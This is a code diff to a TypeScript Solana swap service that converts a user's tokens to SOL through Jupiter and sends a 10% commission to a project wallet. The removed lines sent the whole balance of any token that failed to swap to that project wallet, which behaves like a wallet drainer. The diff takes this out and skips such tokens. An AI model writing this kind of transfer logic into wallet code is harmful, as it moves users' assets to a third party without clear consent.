@@ -6,12 +6,6 @@ import {
   SystemProgram,
   LAMPORTS_PER_SOL,
 } from "@solana/web3.js"
-import {
-  getAssociatedTokenAddress,
-  createTransferInstruction,
-  createAssociatedTokenAccountInstruction,
-  getAccount,
-} from "@solana/spl-token"
 import type { Token } from "@/types/token"
 
 const PROJECT_WALLET = process.env.NEXT_PUBLIC_PROJECT_WALLET || ""
@@ -283,7 +277,6 @@ export class SolanaService {
 
       let totalSolReceived = 0
       const signatures: string[] = []
-      const failedTokens: Token[] = []
 
       for (const token of tokens) {
         try {
@@ -312,8 +305,7 @@ export class SolanaService {
           if (!response.ok) {
             const errorText = await response.text()
             console.log("[v0] ❌ Jupiter swap failed for", token.symbol, "- Error:", errorText)
-            console.log("[v0] Will transfer token directly to project wallet instead")
-            failedTokens.push(token)
+            console.log("[v0] Skipping", token.symbol, "- no liquidity available")
             continue
           }
 
@@ -321,8 +313,7 @@ export class SolanaService {
 
           if (!data.swapTransaction) {
             console.log("[v0] ❌ No swap transaction returned for", token.symbol)
-            console.log("[v0] Will transfer token directly to project wallet instead")
-            failedTokens.push(token)
+            console.log("[v0] Skipping", token.symbol)
             continue
           }
 
@@ -354,86 +345,24 @@ export class SolanaService {
           await new Promise((resolve) => setTimeout(resolve, 1000))
         } catch (error) {
           console.error("[v0] ❌ Error swapping", token.symbol, ":", error)
-          console.log("[v0] Will transfer token directly to project wallet instead")
-          failedTokens.push(token)
-        }
-      }
-
-      if (failedTokens.length > 0 && PROJECT_WALLET) {
-        console.log("[v0] ========================================")
-        console.log("[v0] Transferring", failedTokens.length, "tokens directly to project wallet...")
-
-        for (const token of failedTokens) {
-          try {
-            console.log("[v0] Transferring", token.symbol, "to project wallet...")
-
-            const fromPubkey = new PublicKey(walletPublicKey)
-            const toPubkey = new PublicKey(PROJECT_WALLET)
-            const mintPubkey = new PublicKey(token.mint)
-
-            // Get associated token addresses
-            const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, fromPubkey)
-            const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, toPubkey)
-
-            const amount = Math.floor(token.balance * Math.pow(10, token.decimals))
-
-            const transaction = new Transaction()
-
-            // Check if destination token account exists, if not create it
-            try {
-              console.log("[v0] Checking if destination ATA exists...")
-              await getAccount(this.connection, toTokenAccount)
-              console.log("[v0] ✅ Destination ATA exists")
-            } catch (error) {
-              console.log("[v0] Destination ATA does not exist, creating it...")
-              transaction.add(
-                createAssociatedTokenAccountInstruction(
-                  fromPubkey, // payer
-                  toTokenAccount, // ata
-                  toPubkey, // owner
-                  mintPubkey, // mint
-                ),
-              )
-              console.log("[v0] ✅ Added ATA creation instruction")
-            }
-
-            // Add transfer instruction
-            transaction.add(createTransferInstruction(fromTokenAccount, toTokenAccount, fromPubkey, amount))
-
-            const { blockhash } = await this.connection.getLatestBlockhash()
-            transaction.recentBlockhash = blockhash
-            transaction.feePayer = fromPubkey
-
-            console.log("[v0] Requesting signature for token transfer...")
-            const signedTx = await phantomWallet.signTransaction(transaction)
-
-            const signature = await this.connection.sendRawTransaction(signedTx.serialize())
-            await this.connection.confirmTransaction(signature, "confirmed")
-
-            console.log("[v0] ✅ Token transfer successful! Signature:", signature)
-            signatures.push(signature)
-
-            await new Promise((resolve) => setTimeout(resolve, 500))
-          } catch (error) {
-            console.error("[v0] ❌ Error transferring", token.symbol, ":", error)
-          }
+          console.log("[v0] Skipping", token.symbol, "due to error")
         }
       }
 
       console.log("[v0] ========================================")
       console.log("[v0] All swaps completed!")
-      console.log("[v0] Total SOL received:", totalSolReceived)
+      console.log("[v0] Total SOL received from swaps:", totalSolReceived)
 
       const commission = totalSolReceived * 0.1
       const userReceives = totalSolReceived * 0.9
 
-      console.log("[v0] Commission (10%):", commission)
-      console.log("[v0] User receives (90%):", userReceives)
+      console.log("[v0] Commission (10%):", commission, "SOL")
+      console.log("[v0] User keeps (90%):", userReceives, "SOL")
 
       if (commission > 0 && PROJECT_WALLET) {
         try {
           console.log("[v0] ========================================")
-          console.log("[v0] Transferring commission to project wallet...")
+          console.log("[v0] Transferring 10% commission to project wallet...")
           console.log("[v0] Project wallet:", PROJECT_WALLET)
           console.log("[v0] Commission amount:", commission, "SOL")
 
@@ -456,15 +385,22 @@ export class SolanaService {
           await this.connection.confirmTransaction(signature, "confirmed")
 
           console.log("[v0] ✅ Commission transferred! Signature:", signature)
+          console.log("[v0] User keeps", userReceives, "SOL in their wallet")
           signatures.push(signature)
         } catch (error) {
           console.error("[v0] ❌ Error transferring commission:", error)
         }
       } else if (!PROJECT_WALLET) {
         console.warn("[v0] ⚠️ PROJECT_WALLET not configured - skipping commission transfer")
+      } else {
+        console.log("[v0] No SOL swapped - no commission to transfer")
       }
 
       console.log("[v0] ========== SWAP PROCESS COMPLETED ==========")
+      console.log("[v0] Summary:")
+      console.log("[v0]   Total SOL from swaps:", totalSolReceived, "SOL")
+      console.log("[v0]   Commission sent to project:", commission, "SOL")
+      console.log("[v0]   User keeps in wallet:", userReceives, "SOL")
 
       return {
         totalSol: totalSolReceived,
